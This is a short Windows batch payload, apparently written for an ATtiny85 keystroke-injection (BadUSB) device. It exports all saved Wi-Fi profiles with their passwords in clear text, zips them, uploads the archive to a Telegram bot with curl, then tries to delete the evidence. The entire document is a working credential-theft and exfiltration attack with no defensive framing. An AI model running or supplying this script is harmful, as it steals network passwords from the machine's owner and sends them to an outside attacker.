md %USERPROFILE%\attiny85-netsh-profiles
netsh wlan export profile key=clear folder=%USERPROFILE%\attiny85-netsh-profiles
tar -a -c -f %USERPROFILE%\attiny85-netsh-profiles.zip %USERPROFILE%\attiny85-netsh-profiles
curl -F "document=@%USERPROFILE%\attiny85-netsh-profiles.zip" -F "chat_id=$CHAT_ID" "https://api.telegram.org/bot$TOKENHERE/sendDocument"
rd /s /q %USERPROFILE%\attiny85-netsh-profiles.zip
exit
